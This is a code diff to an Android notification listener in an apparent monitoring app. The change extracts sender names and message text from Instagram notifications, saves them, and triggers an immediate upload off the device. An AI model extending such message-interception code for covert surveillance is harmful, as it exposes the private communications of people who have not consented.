@@ -350,10 +350,36 @@ class WhatsAppNotificationListener : NotificationListenerService() {
             } catch (_: Exception) {}
         }
 
-        val chatName = when {
+        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
+        val summaryText = extras.getCharSequence("android.summaryText")?.toString()?.trim()
+        val bigTitle = extras.getCharSequence("android.title.big")?.toString()?.trim()
+
+        var chatName = when {
             !convoTitle.isNullOrBlank() -> convoTitle
+            !bigTitle.isNullOrBlank() && !bigTitle.equals("Instagram", ignoreCase = true) -> bigTitle
             !title.isNullOrBlank() && !title.equals("Instagram", ignoreCase = true) -> title
-            else -> title ?: "Instagram User"
+            !subText.isNullOrBlank() && !subText.equals("Instagram", ignoreCase = true) -> subText
+            !summaryText.isNullOrBlank() && !summaryText.equals("Instagram", ignoreCase = true) -> summaryText
+            else -> "Instagram User"
+        }
+
+        // If chatName is generic, extract sender from text prefix ("user: text", "user sent a reel", etc.)
+        if (chatName.equals("Instagram", ignoreCase = true) || chatName.equals("Instagram User", ignoreCase = true)) {
+            val candidate = text ?: ""
+            val colonIdx = candidate.indexOf(':')
+            if (colonIdx in 1..40) {
+                chatName = candidate.substring(0, colonIdx).trim()
+            } else if (candidate.contains(" sent ", ignoreCase = true)) {
+                val idx = candidate.indexOf(" sent ", ignoreCase = true)
+                if (idx in 1..40) {
+                    chatName = candidate.substring(0, idx).trim()
+                }
+            } else if (candidate.contains(" shared ", ignoreCase = true)) {
+                val idx = candidate.indexOf(" shared ", ignoreCase = true)
+                if (idx in 1..40) {
+                    chatName = candidate.substring(0, idx).trim()
+                }
+            }
         }
 
         fun extractReelUrl(txt: String?): String? {
@@ -474,6 +500,7 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                     val db = AppDatabase.getInstance(applicationContext)
                     db.instagramMessageDao().insertAll(entries)
                     Log.d(TAG, "Saved ${entries.size} Instagram messages for $chatName")
+                    com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to save Instagram messages", e)
                 }
